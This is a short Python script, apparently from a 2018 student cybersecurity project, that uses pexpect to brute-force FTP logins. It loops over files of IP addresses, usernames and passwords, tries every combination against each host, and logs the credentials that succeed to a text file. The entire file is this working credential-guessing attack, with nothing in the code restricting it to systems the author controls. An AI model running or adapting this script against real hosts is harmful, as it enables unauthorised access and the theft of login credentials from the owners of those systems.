# www.pythonforbeginners.com/systemes-programming/how-to-use-the-pexpect-module-in-python
# Amanda Suydam November 2018, Cybersecurity project.
# Attempting to remotely access the ftp port for the raspberry pi scanner

import pexpect

# I need some sort of output into a file
f1 = open('./text1', 'w+')

# get the ips, users, and passwords from the file
ip = [line.rstrip('\n') for line in open('ip.txt')]
usr = [line.rstrip('\n') for line in open('users.txt')]
pw = [line.rstrip('\n') for line in open('passwords.txt')]

#this will need to read in from a file of ip addresses
for k in ip :
    ftpip = 'ftp ' + str(k)

    # username list 
    for l in usr :
        name = str(l)

        # password list 
        for m in pw :
            passw = str(m)
            # Start the process to connect
            child = pexpect.spawn(ftpip)
            # we'll get one of two possibilities: either name for login or just the ftp prompt if there is no route/ connection refused
            i = child.expect(['Name.*:', 'ftp>'])
            # if we got a connection! Send over info
            if i == 0:
                # send over the first user name in the file
                child.sendline(name)
                child.expect('Password:')
                #send over the password
                child.sendline(passw)
                child.expect('ftp>')
                print ('connected')
                f1.write(child.before + " IP: " + str(k) + " Username: " + name + " Password: " + passw)
    #connection refused. 
            elif i == 1:
                print('Connection refused')
                f1.write('Connection refused. IP: ' + str(k))
    #close connection either way
            child.sendline('bye')

f1.close()

